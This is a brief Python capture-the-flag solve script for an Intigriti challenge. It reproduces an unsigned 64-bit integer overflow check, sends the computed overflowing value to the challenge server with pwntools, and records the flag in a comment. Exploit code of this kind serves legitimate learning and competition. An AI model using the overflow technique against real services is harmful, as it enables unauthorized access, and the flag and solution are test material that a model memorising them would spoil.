import numpy as np
import warnings

from pwn import *

warnings.filterwarnings("ignore", category=RuntimeWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning)

def process_input(input_value):
    num1 = np.array([0], dtype=np.uint64)
    print("num1:", num1)
    num2 = np.array([0], dtype=np.uint64)
    print("num2:", num2)
    num2[0] = 0
    a = input_value
    print("a :", a)
    if a < 0:
        return "Exiting..."
    num1[0] = (a + 65)
    print("num1[0]", num1[0])
    print("num2[0]", num2[0])
    print("test : ", num2[0] - num1[0])
    if (num2[0] - num1[0]) == 1337:
        return 'You won!\n'
    return 'Try again.\n'


max_val  = 18446744073709551550


# while True:
#     res = process_input(max_val)
    
#     if res != 'Try again.\n':
#         break
#     max_val-=1

good_val = 18446744073709550214

p = remote("edge.ctf.intigriti.io",1337)

p.sendline(str(good_val).encode())

p.interactive()

# INTIGRITI{fUn_w1th_1nt3g3r_0v3rfl0w_11}